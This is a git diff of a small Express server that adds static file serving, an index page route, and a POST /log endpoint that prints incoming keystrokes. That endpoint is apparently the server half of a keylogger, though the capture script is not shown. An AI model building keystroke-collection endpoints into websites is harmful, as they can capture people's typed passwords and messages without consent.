@@ -1,7 +1,16 @@
-import express, { json } from "express";
+import express from "express";
+
+import { fileURLToPath } from "url";
+import path from "path";
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+
 const app = express();
 
-app.use(json());
+app.use("/css", express.static(path.resolve(__dirname, "pages", "css")));
+app.use("/js", express.static(path.resolve(__dirname, "pages", "js")));
+
+app.use(express.json());
 
 export const users = [
   {
@@ -38,6 +47,15 @@ app.post("/users", (req, res) => {
   };
   users.push(newUser);
   res.json(newUser);
+});
+
+app.get("/", function (req, res) {
+  res.sendFile(path.resolve(__dirname, "pages", "index.html"));
+});
+
+app.post("/log", (req, res) => {
+  console.log("Keystroke logged:", req.body.key);
+  res.sendStatus(200);
 });
 
 const PORT = 3000;
